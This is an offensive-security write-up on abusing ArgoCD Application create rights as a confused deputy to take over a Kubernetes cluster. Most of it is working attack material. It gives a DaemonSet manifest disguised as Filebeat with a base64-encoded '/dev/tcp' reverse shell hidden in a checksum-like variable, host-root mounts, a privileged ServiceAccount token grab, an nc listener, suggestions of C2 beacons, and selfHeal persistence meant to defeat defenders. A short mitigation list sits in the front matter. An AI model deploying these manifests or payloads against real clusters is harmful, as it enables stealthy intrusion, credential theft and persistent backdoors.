---
title: Weaponizing ArgoCD Application
description: Abusing ArgoCD as a confused deputy to deploy disguised privileged workloads cluster-wide and maintain persistent access
category: offensive
createdAt: 2026-04-10
impact: Full cluster compromise through privileged workload deployment, host filesystem access, and persistent backdoor that survives pod deletion
mitigation:
  - Grant **applications create** in ArgoCD RBAC only to trusted users and scope it to specific AppProjects rather than wildcard
  - Use **AppProject** to enforce source repository allowlists, destination namespace restrictions, and cluster resource whitelists to limit what an Application can deploy
  - Enable **Pod Security Admission** and admission policies to block privileged workload configurations including hostPID, hostNetwork, hostIPC, hostPath mounts and images from untrusted registries
  - Alert on **Application creation events** that reference repositories not in the approved list
mitreTechniques:
  - T1610
  - T1059
  - T1036
  - T1611
references: |
  - [ArgoCD RBAC Configuration](https://argo-cd.readthedocs.io/en/stable/operator-manual/rbac/)
  - [ArgoCD AppProject Documentation](https://argo-cd.readthedocs.io/en/stable/user-guide/projects/)
---

ArgoCD is a GitOps continuous delivery tool that runs a **privileged service account** in the cluster to deploy and reconcile application manifests. An attacker who has only `create` permission on ArgoCD `Application` resources can exploit this trust relationship. They do not need direct pod creation access. **ArgoCD's own service account** performs the deployment on their behalf, making this a classic **confused deputy attack**.

The only required RBAC permission is:

```yaml
rules:
  - apiGroups: ["argoproj.io"]
    resources: ["applications"]
    verbs: ["create"]
```

This single Kubernetes RBAC rule is enough to achieve cluster-wide privileged pod deployment.

## Understanding the Attack Surface

ArgoCD's controller service account typically holds broad Kubernetes permissions to reconcile any resource across the cluster. When an attacker creates an `Application`, ArgoCD reads the desired state from a Git repository and applies it using its own credentials, not the attacker's. This means the attacker's Kubernetes RBAC is irrelevant once the `Application` object exists.

The key misuse here is that ArgoCD treats the `Application` object as a **trusted instruction**. It does not verify whether the user who created the `Application` actually has permission to deploy the resources defined inside it. The authorization check happens at the **ArgoCD RBAC level only**, not at the Kubernetes resource level for the requesting user.

## Repository Setup

The attacker hosts a Git repository that mimics a real internal infrastructure repository, using names, labels, and images that blend in with legitimate cluster tooling. ArgoCD only needs read access to it.

The manifest is disguised as Filebeat, a widely deployed log shipping agent that runs as a DaemonSet on every node in most production clusters. Filebeat legitimately requires access to host log directories and runs as root, making the `hostPath` mounts and `runAsUser: 0` security context completely expected to anyone reviewing the manifest.

The reverse shell payload is **base64-encoded** and stored in an environment variable named `FB_CONF_CHECKSUM`. The name is deliberately chosen to blend in with real Filebeat environment variables like `ELASTICSEARCH_HOST` and `ELASTICSEARCH_PORT`. To anyone running `kubectl describe`, the value looks like an opaque configuration checksum rather than an executable payload.

The `command` field runs the payload in a **background subshell** first, then immediately replaces itself with the real Filebeat binary using `exec`. This means the main container process is always the **legitimate Filebeat process**. The reverse shell runs as a detached child process and does not appear in the container's **PID 1**.

```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: filebeat
  namespace: logging
  labels:
    app: filebeat
    app.kubernetes.io/name: filebeat
    app.kubernetes.io/managed-by: argocd
    app.kubernetes.io/part-of: logging
spec:
  selector:
    matchLabels:
      app: filebeat
  template:
    metadata:
      labels:
        app: filebeat
        app.kubernetes.io/name: filebeat
    spec:
      hostPID: true
      hostNetwork: true
      hostIPC: true
      tolerations:
        - operator: Exists
      securityContext:
        runAsUser: 0
      containers:
        - name: filebeat
          image: docker.elastic.co/beats/filebeat:8.13.0
          command:
            - bash
            - -c
            - |
              (echo $FB_CONF_CHECKSUM | base64 -d | bash &)
              exec /usr/share/filebeat/filebeat -e
          env:
            - name: ELASTICSEARCH_HOST
              value: "elasticsearch.logging.svc.cluster.local"
            - name: ELASTICSEARCH_PORT
              value: "9200"
            - name: FB_CONF_CHECKSUM
              value: "YmFzaCAtaSA+JiAvZGV2L3RjcC94LngueC54LzQ0NDQgMD4mMQ=="
          volumeMounts:
            - mountPath: /host
              name: host-root
              readOnly: false
      volumes:
        - name: host-root
          hostPath:
            path: /
```

The bash reverse shell is not the only option. The payload can be swapped for any technique that fits the tools available inside the image. Python socket connections, Perl one-liners, or a pre-compiled binary dropped from a remote server are all viable alternatives. The limiting factor is always what is installed in the container image.

A more reliable approach is using a **C2 agent** beacon as the encoded payload in `FB_CONF_CHECKSUM` instead of a raw reverse shell. When the pod starts, it decodes and executes the beacon which calls back to the attacker's C2 server such as Sliver, Havoc or Mythic. A reverse shell gives a single interactive session. If the connection drops, the reverse shell process exits but the pod keeps running. The attacker must delete the pod to trigger selfHeal and spawn a new session. A C2 beacon runs as a persistent background process inside the pod and reconnects to the C2 server automatically when the connection drops, without requiring the pod to be restarted.

Filebeat is Ubuntu-based, so `bash`, `curl`, `python3` and other common tools are available. This makes it a flexible payload host. Choosing a disguise image that includes a shell is therefore a deliberate part of this technique.

> [!NOTE]
> Distroless images ship with no shell, no package manager and often no standard utilities at all, which significantly limits what an attacker can execute directly inside the container. If the target cluster enforces distroless images, the attacker must rely on a pre-compiled static binary or find another execution path.

The `FB_CONF_CHECKSUM` value decodes to the following reverse shell command, where `x.x.x.x` is replaced with the attacker's listener IP:

```bash
bash -i >& /dev/tcp/x.x.x.x/4444 0>&1
```

Mounting the **host root filesystem** at `/host` is sufficient to take over the node. From inside the container, the attacker has full read and write access to every file on the host including **kubelet credentials**, **container runtime sockets**, SSH keys and secrets from other pods. The attacker listens for the incoming connection:

```bash
nc -lvnp 4444
```


## Mounting a Privileged ServiceAccount

Mounting the host filesystem is not the only path. An attacker can also specify a **high-privileged ServiceAccount** in the pod spec using `serviceAccountName`. The pod will then have that ServiceAccount's token mounted automatically at runtime, giving API server access at whatever privilege level that ServiceAccount holds.

The key requirement is knowing what ServiceAccounts exist in the **destination namespace**. ServiceAccounts are namespace-scoped, so the pod can only reference SAs in the same namespace it is deployed into. This is where knowing what ServiceAccounts are present by default matters. If the destination namespace is `argocd`, the attacker can reference `argocd-application-controller`, which holds full wildcard cluster permissions by design. If deploying into another namespace, the attacker needs to identify a high-privileged SA that exists there.

The ArgoCD Application destination must point to the namespace where the SA exists:

```yaml
spec:
  destination:
    namespace: argocd
```

The pod manifest deployed by ArgoCD then references the SA by name:

```yaml
spec:
  serviceAccountName: argocd-application-controller
  containers:
    - name: filebeat
      ...
```

`argocd-application-controller` is bound to a ClusterRole with full wildcard permissions across every API group, resource, and verb in the cluster, effectively equivalent to `cluster-admin`:

```yaml
rules:
  - apiGroups: ["*"]
    resources: ["*"]
    verbs: ["*"]
```

This means the token grants the ability to read and write any resource in any namespace including Secrets, create ClusterRoleBindings, modify workloads, and access etcd-backed data. Once the pod is running, the token is available at the standard mount path and can be used directly against the API server:

```bash
cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

This approach is useful when the target namespace has Pod Security Admission or admission webhooks that block hostPath mounts, since it requires no volume mounts at all.

## Creating the Application

The attacker creates an ArgoCD `Application` pointing to their repository. The name, labels, and path structure are all chosen to mirror how a real logging stack would appear in the ArgoCD UI, indistinguishable from a deployment made by the platform team.

The `repoURL` uses `<attacker_org>` as a placeholder for the attacker's GitHub organization. In practice this would be named to resemble an internal team or a known open source project to avoid raising suspicion when reviewed.

```yaml
apiVersion: argoproj.io/v1alpha1
kind: Application
metadata:
  name: filebeat
  namespace: argocd
  labels:
    team: platform
    component: logging
    env: production
spec:
  project: default
  source:
    repoURL: https://github.com/<attacker_org>/helm-charts
    targetRevision: main
    path: charts/filebeat
  destination:
    server: https://kubernetes.default.svc
    namespace: logging
  syncPolicy:
    automated:
      prune: false
      selfHeal: true
```

Within seconds of creation, ArgoCD syncs the manifests and the DaemonSet is deployed across every node in the cluster. Each node independently calls back to the attacker.

## Persistence Through selfHeal

The **`selfHeal: true`** sync policy is what makes this technique persistent. If a defender detects and deletes the malicious DaemonSet or its pods, ArgoCD detects the **drift** from the desired Git state and immediately reconciles by recreating the resources. This cycle repeats **indefinitely** until the `Application` object itself is removed.

```
Defender deletes daemonset/filebeat
        ↓
ArgoCD detects drift from desired state
        ↓
ArgoCD recreates daemonset/filebeat within seconds
        ↓
Pod calls back to attacker on all nodes
```

The only way to stop this cycle is to delete the `Application` object or suspend ArgoCD sync. Both actions require ArgoCD admin access or cluster-level permissions that the attacker did not need to create the situation in the first place.
